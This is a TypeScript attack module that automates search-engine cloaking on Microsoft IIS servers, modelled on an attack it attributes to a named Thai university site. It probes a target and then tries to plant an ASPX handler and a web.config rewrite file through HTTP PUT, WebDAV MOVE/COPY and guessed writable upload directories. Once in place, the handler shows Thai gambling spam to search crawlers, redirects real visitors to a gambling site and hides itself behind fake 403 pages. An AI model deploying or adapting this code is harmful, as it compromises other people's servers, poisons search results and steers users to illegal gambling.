/**
 * IIS UA Cloaking Attack Module
 * 
 * Implements the nsru.ac.th-style attack:
 * - Googlebot/Bingbot → 200 OK with gambling SEO content
 * - Real users → 403 or redirect to gambling site
 * - Uses IIS URL Rewrite rules in web.config
 * - Deploys ASPX handler for dynamic cloaking
 * - Supports both web.config injection and ASPX shell deployment
 */

// ─── Types ───────────────────────────────────────────────

export interface IISCloakingConfig {
  targetUrl: string;
  redirectUrl: string;
  seoContent?: string;
  seoTitle?: string;
  seoKeywords?: string[];
  onProgress?: (phase: string, detail: string) => void;
}

export interface IISCloakingResult {
  success: boolean;
  method: string;
  technique: string;
  url: string;
  shellUrl?: string;
  uploadedFiles?: string[];
  details: string;
  severity: "critical" | "high" | "medium" | "low" | "info";
  timestamp: number;
}

// ─── Helper ──────────────────────────────────────────────

function randomStr(len: number): string {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  let s = "";
  for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)];
  return s;
}

async function safeFetch(url: string, opts: RequestInit & { timeout?: number } = {}): Promise<Response> {
  const timeout = opts.timeout || 10000;
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeout);
  try {
    const resp = await fetch(url, {
      ...opts,
      signal: controller.signal,
      redirect: opts.redirect || "follow",
    });
    return resp;
  } finally {
    clearTimeout(timer);
  }
}

// ─── web.config templates ────────────────────────────────

/**
 * Generate IIS web.config with UA-based cloaking (nsru.ac.th style)
 * Bots see SEO content, real users get blocked/redirected
 */
export function generateWebConfigUACloaking(config: {
  redirectUrl: string;
  seoContentPath?: string;
  blockRealUsers?: boolean;
}): string {
  const seoPath = config.seoContentPath || "/seo-content";
  const blockOrRedirect = config.blockRealUsers
    ? `<action type="CustomResponse" statusCode="403" subStatusCode="0" statusReason="Forbidden" statusDescription="Access denied" />`
    : `<action type="Redirect" url="${config.redirectUrl}" redirectType="Found" />`;

  return `<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <rewrite>
      <rules>
        <!-- Rule 1: Bot Cloaking — serve SEO content to search engine bots -->
        <rule name="BotCloakServe" stopProcessing="true">
          <match url="(.*)" />
          <conditions logicalGrouping="MatchAny">
            <!-- Search engine bot User-Agents -->
            <add input="{HTTP_USER_AGENT}" pattern="(Googlebot|Googlebot-Mobile|Googlebot-Image|Googlebot-News|Googlebot-Video|Storebot-Google|Google-InspectionTool|GoogleOther|Bingbot|Slurp|DuckDuckBot|Baiduspider|YandexBot|Sogou|Exabot|ia_archiver|facebot|facebookexternalhit|Twitterbot|LinkedInBot|Pinterestbot)" negate="false" />
            <!-- Google IP ranges -->
            <add input="{REMOTE_ADDR}" pattern="^(66\\.249\\.|64\\.233\\.|142\\.250\\.|172\\.217\\.|209\\.85\\.|216\\.58\\.|74\\.125\\.)" />
            <!-- Bing IP ranges -->
            <add input="{REMOTE_ADDR}" pattern="^(40\\.77\\.|157\\.55\\.|207\\.46\\.|13\\.66\\.|13\\.67\\.)" />
          </conditions>
          <action type="Rewrite" url="${seoPath}/{R:1}" />
        </rule>
        <!-- Rule 2: Real users — block or redirect -->
        <rule name="RealUserRedirect" stopProcessing="true">
          <match url="(.*)" />
          <conditions logicalGrouping="MatchAll">
            <add input="{HTTP_USER_AGENT}" pattern="(Googlebot|Bingbot|Slurp|DuckDuckBot|Baiduspider|YandexBot|facebot|facebookexternalhit|Twitterbot)" negate="true" />
          </conditions>
          ${blockOrRedirect}
        </rule>
      </rules>
    </rewrite>
    <!-- Disable directory browsing -->
    <directoryBrowse enabled="false" />
    <!-- Custom error pages to avoid IIS default -->
    <httpErrors errorMode="Custom" existingResponse="Replace">
      <remove statusCode="403" />
      <error statusCode="403" path="/error403.html" responseMode="File" />
    </httpErrors>
  </system.webServer>
</configuration>`;
}

/**
 * Generate web.config with ASPX handler mapping for cloaking
 * Maps all requests to a custom ASPX handler that does UA detection
 */
export function generateWebConfigWithHandler(handlerFile: string): string {
  return `<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="CloakHandler" path="*" verb="GET,HEAD" type="System.Web.UI.PageHandlerFactory" resourceType="Unspecified" />
    </handlers>
    <defaultDocument>
      <files>
        <clear />
        <add value="${handlerFile}" />
      </files>
    </defaultDocument>
    <directoryBrowse enabled="false" />
  </system.webServer>
  <system.web>
    <compilation targetFramework="4.0" />
    <customErrors mode="Off" />
  </system.web>
</configuration>`;
}

// ─── ASPX Cloaking Handler ───────────────────────────────

/**
 * Generate ASPX handler that does full UA cloaking (nsru.ac.th style)
 * - Bots: 200 OK + full gambling SEO page
 * - Real users from Google: 302 redirect to gambling site
 * - Direct visitors: 403 or normal page
 */
export function generateAspxCloakingHandler(config: {
  redirectUrl: string;
  seoTitle?: string;
  seoKeywords?: string[];
  seoContent?: string;
}): string {
  const title = config.seoTitle || "สล็อตเว็บตรง 2026 ทดลองเล่นสล็อตฟรี PG Slot";
  const keywords = config.seoKeywords || [
    "สล็อตเว็บตรง", "PG Slot", "เครดิตฟรี", "สล็อต 2026",
    "ทดลองเล่นสล็อตฟรี", "เว็บตรงไม่ผ่านเอเย่นต์",
  ];
  const content = config.seoContent || generateDefaultSeoContent(keywords);

  return `<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Web" %>
<script runat="server">
    // Bot detection patterns
    static readonly string[] BotPatterns = {
        "googlebot", "bingbot", "slurp", "duckduckbot", "baiduspider",
        "yandexbot", "sogou", "exabot", "ia_archiver", "facebot",
        "facebookexternalhit", "twitterbot", "linkedinbot", "pinterestbot",
        "google-inspectiontool", "googleother", "storebot-google",
        "google-structured-data-testing-tool", "google-adwords",
        "adsbot-google", "mediapartners-google"
    };
    
    // Google IP ranges (first octets)
    static readonly string[] GoogleIpPrefixes = {
        "66.249.", "64.233.", "142.250.", "172.217.", "209.85.", 
        "216.58.", "74.125.", "173.194.", "108.177."
    };
    
    // Bing IP ranges
    static readonly string[] BingIpPrefixes = {
        "40.77.", "157.55.", "207.46.", "13.66.", "13.67.", "52.167."
    };

    protected void Page_Load(object sender, EventArgs e)
    {
        string ua = (Request.UserAgent ?? "").ToLower();
        string ip = Request.ServerVariables["REMOTE_ADDR"] ?? "";
        string referer = (Request.UrlReferrer?.ToString() ?? "").ToLower();
        
        bool isBot = false;
        
        // Check UA
        foreach (string bot in BotPatterns)
        {
            if (ua.Contains(bot)) { isBot = true; break; }
        }
        
        // Check IP ranges
        if (!isBot)
        {
            foreach (string prefix in GoogleIpPrefixes)
            {
                if (ip.StartsWith(prefix)) { isBot = true; break; }
            }
        }
        if (!isBot)
        {
            foreach (string prefix in BingIpPrefixes)
            {
                if (ip.StartsWith(prefix)) { isBot = true; break; }
            }
        }
        
        if (isBot)
        {
            // Bot: serve SEO content with 200 OK
            Response.StatusCode = 200;
            Response.ContentType = "text/html; charset=utf-8";
            // Content is rendered below in the HTML section
            return;
        }
        
        // Real user from search engine: redirect
        if (referer.Contains("google.") || referer.Contains("bing.") || 
            referer.Contains("yahoo.") || referer.Contains("duckduckgo.") ||
            Request.QueryString["r"] == "1" || Request.QueryString["ref"] == "g")
        {
            Response.StatusCode = 302;
            Response.AddHeader("Location", "${config.redirectUrl}");
            Response.End();
            return;
        }
        
        // Direct visitor: show 403 (hide the cloaking)
        Response.StatusCode = 403;
        Response.ContentType = "text/html";
        Response.Write("<html><body><h1>403 - Forbidden</h1><p>Access denied.</p></body></html>");
        Response.End();
    }
</script>
<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="utf-8">
    <title>${escapeXml(title)}</title>
    <meta name="description" content="${escapeXml(keywords.join(", "))}">
    <meta name="keywords" content="${escapeXml(keywords.join(", "))}">
    <meta name="robots" content="index, follow">
    <meta property="og:title" content="${escapeXml(title)}">
    <meta property="og:description" content="${escapeXml(keywords.slice(0, 5).join(", "))}">
    <meta property="og:type" content="website">
    <link rel="canonical" href="${config.redirectUrl}">
    <style>
        body { font-family: 'Sarabun', sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; }
        h1, h2, h3 { color: #1a1a2e; }
        .content { background: white; padding: 30px; border-radius: 8px; margin: 20px 0; }
        a { color: #e94560; text-decoration: none; }
        .keywords { display: flex; flex-wrap: wrap; gap: 8px; margin: 15px 0; }
        .keyword { background: #e94560; color: white; padding: 5px 12px; border-radius: 15px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>${escapeXml(title)}</h1>
        <div class="keywords">
            ${keywords.map(k => `<span class="keyword">${escapeXml(k)}</span>`).join("\n            ")}
        </div>
        <div class="content">
            ${content}
        </div>
    </div>
</body>
</html>`;
}

function escapeXml(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}

function generateDefaultSeoContent(keywords: string[]): string {
  // Generate realistic Thai gambling SEO content
  const sections = [
    `<h2>${keywords[0] || "สล็อตเว็บตรง"} แนะนำเว็บสล็อตยอดนิยม 2026</h2>
<p>${keywords[0] || "สล็อตเว็บตรง"} เป็นที่นิยมอย่างมากในประเทศไทย ด้วยระบบที่ทันสมัยและปลอดภัย ผู้เล่นสามารถเพลิดเพลินกับเกมสล็อตออนไลน์ได้ตลอด 24 ชั่วโมง พร้อมโปรโมชั่นสุดพิเศษสำหรับสมาชิกใหม่ เครดิตฟรีไม่ต้องฝาก ถอนได้จริง</p>`,
    `<h2>ทดลองเล่นสล็อตฟรี ${keywords[1] || "PG Slot"}</h2>
<p>สำหรับผู้ที่ต้องการทดลองเล่นก่อนลงทุนจริง เราให้บริการทดลองเล่นสล็อตฟรีทุกค่าย ไม่ว่าจะเป็น ${keywords[1] || "PG Slot"}, Pragmatic Play, Jili, หรือค่ายชั้นนำอื่นๆ สมัครง่าย ฝาก-ถอนรวดเร็วผ่านระบบอัตโนมัติ</p>`,
    `<h2>${keywords[2] || "เครดิตฟรี"} สมาชิกใหม่ 2026</h2>
<p>รับ${keywords[2] || "เครดิตฟรี"}ทันทีเมื่อสมัครสมาชิก ไม่ต้องฝากก่อน ถอนได้จริง ไม่มีเงื่อนไขซับซ้อน เว็บตรงไม่ผ่านเอเย่นต์ มั่นคง ปลอดภัย จ่ายจริงทุกยอด</p>`,
    `<h3>ทำไมต้องเลือกเรา?</h3>
<ul>
<li>เว็บตรงไม่ผ่านเอเย่นต์ ปลอดภัย 100%</li>
<li>ฝาก-ถอนอัตโนมัติ รวดเร็วภายใน 30 วินาที</li>
<li>รองรับทุกธนาคาร และ True Wallet</li>
<li>โปรโมชั่นสุดคุ้ม เครดิตฟรีทุกวัน</li>
<li>เกมสล็อตครบทุกค่าย มากกว่า 1,000 เกม</li>
<li>บริการ 24 ชั่วโมง ทีมงานมืออาชีพ</li>
</ul>`,
  ];
  return sections.join("\n");
}

// ─── Main Attack Function ────────────────────────────────

/**
 * Execute IIS UA Cloaking attack (nsru.ac.th style)
 * Tries multiple methods to deploy cloaking on IIS servers
 */
export async function executeIISUACloaking(config: IISCloakingConfig): Promise<IISCloakingResult> {
  const base = config.targetUrl.replace(/\/$/, "");
  const progress = config.onProgress || (() => {});
  const uploadedFiles: string[] = [];

  progress("iis_ua_cloak", "🖥️ ตรวจสอบ IIS server...");

  try {
    // Step 1: Verify IIS server
    const headResp = await safeFetch(base, { method: "HEAD", timeout: 8000 });
    const server = (headResp.headers.get("server") || "").toLowerCase();
    const powered = (headResp.headers.get("x-powered-by") || "").toLowerCase();

    const isIIS = server.includes("iis") || server.includes("microsoft") || powered.includes("asp");
    if (!isIIS) {
      return {
        success: false, method: "iis_ua_cloaking", technique: "IIS UA Cloaking",
        url: base, details: `Not IIS server (server: ${server}, x-powered-by: ${powered})`,
        severity: "info", timestamp: Date.now(),
      };
    }

    progress("iis_ua_cloak", `✅ IIS detected: ${server} / ${powered}`);

    // Step 2: Try deploying ASPX cloaking handler
    progress("iis_ua_cloak", "📝 Deploying ASPX cloaking handler...");
    
    const handlerName = `${randomStr(8)}.aspx`;
    const handlerContent = generateAspxCloakingHandler({
      redirectUrl: config.redirectUrl,
      seoTitle: config.seoTitle,
      seoKeywords: config.seoKeywords,
      seoContent: config.seoContent,
    });

    // Try PUT upload
    const putResp = await safeFetch(`${base}/${handlerName}`, {
      method: "PUT",
      headers: { "Content-Type": "text/html" },
      body: handlerContent,
      timeout: 15000,
    });

    if (putResp.status === 200 || putResp.status === 201 || putResp.status === 204) {
      uploadedFiles.push(handlerName);
      progress("iis_ua_cloak", `✅ ASPX handler uploaded: ${handlerName}`);

      // Verify with Googlebot UA
      const verifyResp = await safeFetch(`${base}/${handlerName}`, {
        headers: { "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" },
        timeout: 10000,
      });

      if (verifyResp.status === 200) {
        const body = await verifyResp.text();
        if (body.includes("สล็อต") || body.includes("slot") || body.includes(config.redirectUrl)) {
          progress("iis_ua_cloak", "✅ Cloaking verified — Googlebot sees SEO content");
          
          // Also try to deploy web.config for root-level cloaking
          await tryDeployWebConfig(base, config, progress, uploadedFiles);

          return {
            success: true, method: "iis_ua_cloaking", technique: "ASPX UA Cloaking Handler (nsru-style)",
            url: base, shellUrl: `${base}/${handlerName}`,
            uploadedFiles,
            details: `ASPX cloaking handler deployed — Googlebot: 200+SEO, Users: 302→${config.redirectUrl}, Direct: 403`,
            severity: "critical", timestamp: Date.now(),
          };
        }
      }

      // ASPX uploaded but not executing — try web.config to enable ASPX
      progress("iis_ua_cloak", "⚠️ ASPX uploaded but not executing, trying web.config handler mapping...");
      const webConfigHandler = generateWebConfigWithHandler(handlerName);
      const wcResp = await safeFetch(`${base}/web.config`, {
        method: "PUT",
        headers: { "Content-Type": "application/xml" },
        body: webConfigHandler,
        timeout: 10000,
      });

      if (wcResp.status === 200 || wcResp.status === 201 || wcResp.status === 204) {
        uploadedFiles.push("web.config");
        progress("iis_ua_cloak", "✅ web.config with handler mapping uploaded");

        // Re-verify
        const reVerify = await safeFetch(`${base}/${handlerName}`, {
          headers: { "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" },
          timeout: 10000,
        });

        if (reVerify.status === 200) {
          return {
            success: true, method: "iis_ua_cloaking", technique: "ASPX Handler + web.config (nsru-style)",
            url: base, shellUrl: `${base}/${handlerName}`,
            uploadedFiles,
            details: `ASPX cloaking + web.config handler mapping deployed`,
            severity: "critical", timestamp: Date.now(),
          };
        }
      }
    }

    // Step 3: Try web.config URL Rewrite cloaking (no ASPX needed)
    progress("iis_ua_cloak", "📝 Trying web.config URL Rewrite cloaking...");
    const wcResult = await tryDeployWebConfig(base, config, progress, uploadedFiles);
    if (wcResult) return wcResult;

    // Step 4: Try WebDAV methods
    progress("iis_ua_cloak", "📝 Trying WebDAV methods...");
    for (const method of ["MOVE", "COPY"] as const) {
      try {
        // Upload as .txt first
        const txtResp = await safeFetch(`${base}/${handlerName}.txt`, {
          method: "PUT",
          headers: { "Content-Type": "text/plain" },
          body: handlerContent,
          timeout: 8000,
        });

        if (txtResp.status === 200 || txtResp.status === 201) {
          const moveResp = await safeFetch(`${base}/${handlerName}.txt`, {
            method,
            headers: { Destination: `${base}/${handlerName}`, Overwrite: "T" },
            timeout: 8000,
          });

          if (moveResp.status === 201 || moveResp.status === 204) {
            uploadedFiles.push(handlerName);
            progress("iis_ua_cloak", `✅ ASPX deployed via WebDAV ${method}`);

            return {
              success: true, method: "iis_ua_cloaking", technique: `ASPX via WebDAV ${method} (nsru-style)`,
              url: base, shellUrl: `${base}/${handlerName}`,
              uploadedFiles,
              details: `ASPX cloaking handler deployed via WebDAV ${method}`,
              severity: "critical", timestamp: Date.now(),
            };
          }
        }
      } catch {}
    }

    // Step 5: Try IIS short filename to find existing writable paths
    progress("iis_ua_cloak", "🔍 Scanning for writable directories...");
    const writablePaths = [
      "/uploads/", "/upload/", "/files/", "/media/", "/content/",
      "/App_Data/", "/temp/", "/tmp/", "/images/", "/assets/",
    ];

    for (const path of writablePaths) {
      try {
        const testResp = await safeFetch(`${base}${path}${handlerName}`, {
          method: "PUT",
          headers: { "Content-Type": "text/html" },
          body: handlerContent,
          timeout: 5000,
        });

        if (testResp.status === 200 || testResp.status === 201) {
          uploadedFiles.push(`${path}${handlerName}`);
          progress("iis_ua_cloak", `✅ ASPX uploaded to ${path}`);

          return {
            success: true, method: "iis_ua_cloaking", technique: `ASPX in writable dir ${path}`,
            url: base, shellUrl: `${base}${path}${handlerName}`,
            uploadedFiles,
            details: `ASPX cloaking handler uploaded to writable directory ${path}`,
            severity: "critical", timestamp: Date.now(),
          };
        }
      } catch {}
    }

    return {
      success: false, method: "iis_ua_cloaking", technique: "IIS UA Cloaking",
      url: base, uploadedFiles,
      details: "IIS detected but all upload methods failed (PUT/WebDAV/writable dirs)",
      severity: "medium", timestamp: Date.now(),
    };

  } catch (e: any) {
    return {
      success: false, method: "iis_ua_cloaking", technique: "IIS UA Cloaking",
      url: base, details: `Error: ${e.message}`,
      severity: "info", timestamp: Date.now(),
    };
  }
}

async function tryDeployWebConfig(
  base: string,
  config: IISCloakingConfig,
  progress: (phase: string, detail: string) => void,
  uploadedFiles: string[]
): Promise<IISCloakingResult | null> {
  // Deploy web.config with URL Rewrite rules
  const webConfig = generateWebConfigUACloaking({
    redirectUrl: config.redirectUrl,
    blockRealUsers: false,
  });

  try {
    const resp = await safeFetch(`${base}/web.config`, {
      method: "PUT",
      headers: { "Content-Type": "application/xml" },
      body: webConfig,
      timeout: 10000,
    });

    if (resp.status === 200 || resp.status === 201 || resp.status === 204) {
      uploadedFiles.push("web.config");
      progress("iis_ua_cloak", "✅ web.config URL Rewrite cloaking uploaded");

      // Verify: real user should get redirect
      const verifyResp = await safeFetch(base, {
        redirect: "manual",
        timeout: 8000,
      });
      const loc = verifyResp.headers.get("location") || "";

      if (loc.includes(config.redirectUrl) || verifyResp.status === 302 || verifyResp.status === 403) {
        return {
          success: true, method: "iis_ua_cloaking", technique: "web.config URL Rewrite Cloaking",
          url: base, shellUrl: base,
          uploadedFiles,
          details: `web.config cloaking deployed — real users: ${verifyResp.status} ${loc ? `→ ${loc}` : ""}, bots: SEO content`,
          severity: "critical", timestamp: Date.now(),
        };
      }
    }
  } catch {}

  return null;
}
